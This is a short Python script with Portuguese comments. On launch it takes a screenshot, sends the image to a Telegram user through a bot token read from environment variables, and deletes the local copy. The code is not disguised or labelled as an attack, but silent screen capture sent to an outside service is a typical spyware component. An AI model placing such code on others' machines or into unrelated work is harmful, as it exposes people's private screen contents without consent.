import os
import telebot
import pyautogui

from dotenv import load_dotenv, find_dotenv

load_dotenv(find_dotenv())

TOKEN = os.environ.get("TOKEN")
USERID = os.environ.get("USERID")

# Configurando o bot do Telegram
bot = telebot.TeleBot(TOKEN)

# Função para capturar o print da tela e enviar automaticamente para o usuário
def send_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("arquivo.png")
    with open("arquivo.png", 'rb') as photo:
        bot.send_photo(USERID, photo, caption="Print da tela")
    os.remove("arquivo.png")
# Chamando a função para enviar o print ao iniciar o script
send_screenshot()
